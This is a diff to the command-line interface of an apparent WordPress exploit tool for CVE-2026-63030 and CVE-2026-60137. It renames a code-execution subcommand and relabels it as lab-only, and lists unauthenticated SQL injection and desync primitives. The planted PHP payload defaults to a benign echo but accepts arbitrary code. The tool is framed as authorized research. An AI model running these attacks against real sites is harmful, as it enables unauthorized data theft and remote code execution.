@@ -2,8 +2,8 @@
 
 Subcommands:
   check       non-destructive detector (VULNERABLE / PATCHED / INCONCLUSIVE)
-  sqli        unauthenticated blind/UNION SQLi via the nested batch
-  write-exec  drop a benign PHP file via the desync and prove the server runs it
+  sqli        unauthenticated blind/UNION SQLi via the nested batch (clean core)
+  plugin-rce  code execution via a *vulnerable plugin* write route (lab demo)
   probe       confirm the desync via the handler-substitution signal
   seat        run an arbitrary target handler via the desync
 
@@ -106,11 +106,13 @@ def cmd_sqli(args):
     return 0
 
 
-# ── write-exec ────────────────────────────────────────────────────────────────
-# Non-destructive code-execution PoC. Uses the desync's sanitization bypass (P3) to
-# write a benign PHP file (default: prints 6*7) to a permissive plugin write route,
-# then fetches it to prove the server *executes* it. Needs a vulnerable write route —
-# the bundled lab/acme-templates.php models the common real-world anti-pattern.
+# ── plugin-rce ────────────────────────────────────────────────────────────────
+# PLUGIN-ROUTE code-execution PoC (NOT a core capability). Uses the desync's
+# sanitization bypass (P3) to write a benign PHP file (default: prints 6*7) to a
+# *vulnerable plugin* write route, then fetches it to prove the server executes it.
+# It needs that vulnerable route (the bundled lab/acme-templates.php models the
+# common real-world anti-pattern). Stock core alone has no such unauth write sink;
+# for the no-plugin path see `core-rce`.
 _WE_MARKER = "42-wp2shell-exec-poc"
 _WE_PAYLOAD = '<?php echo (6 * 7) . "-wp2shell-exec-poc"; ?>'  # benign: no input, no syscalls
 
@@ -122,10 +124,10 @@ def _base_of(url):
     return url.rstrip("/")
 
 
-def cmd_write_exec(args):
+def cmd_plugin_rce(args):
     url = _resolve(args.target)
     base = _base_of(url)
-    print("[*] Unauthenticated write+execute PoC via the CVE-2026-63030 desync (sanitization bypass)")
+    print("[*] PLUGIN-ROUTE code-execution PoC via the CVE-2026-63030 desync (needs a vulnerable plugin)")
     if not desync.desync_present(url):
         print("[!] no desync signal — target appears PATCHED (63030 closed). Aborting.")
         return 2
@@ -187,10 +189,11 @@ def build_parser():
         description="CVE-2026-63030 + CVE-2026-60137 research PoC (authorized testing only).",
         epilog=(
             "command groups:\n"
-            "  assessment (use these against an authorized target):\n"
+            "  assessment — clean core, any authorized target:\n"
             "    check       is the target vulnerable? (non-destructive)\n"
             "    sqli        unauthenticated DB read via the clean-core chain\n"
-            "    write-exec  prove unauth code execution (needs a vulnerable plugin write route)\n"
+            "  lab — needs a deliberately-vulnerable plugin you install (lab/acme-templates.php):\n"
+            "    plugin-rce  unauth code execution via a vulnerable plugin write route\n"
             "  research (raw desync primitives):\n"
             "    probe       confirm the desync signal\n"
             "    seat        drive the desync primitive directly\n"))
@@ -224,9 +227,9 @@ def build_parser():
     sq.add_argument("--maxlen", type=int, default=48, help="max chars per value (blind mode)")
     sq.set_defaults(func=cmd_sqli)
 
-    we = sub.add_parser("write-exec",
-                        help="[assessment/lab] drop a benign PHP file via the desync and prove the "
-                             "server executes it (needs a vulnerable plugin write route)")
+    we = sub.add_parser("plugin-rce",
+                        help="[lab] code execution via a VULNERABLE PLUGIN write route (not core); "
+                             "needs lab/acme-templates.php installed on the test site")
     we.add_argument("target")
     we.add_argument("--route", default="/acme/v1/save-file",
                     help="vulnerable write route (default: bundled lab/acme-templates.php)")
@@ -237,7 +240,7 @@ def build_parser():
     we.add_argument("--payload", default=_WE_PAYLOAD,
                     help="PHP to write (default: benign, prints 6*7); keep it non-destructive")
     we.add_argument("--keep", action="store_true", help="do not neutralize the planted file afterwards")
-    we.set_defaults(func=cmd_write_exec)
+    we.set_defaults(func=cmd_plugin_rce)
 
     return ap
 
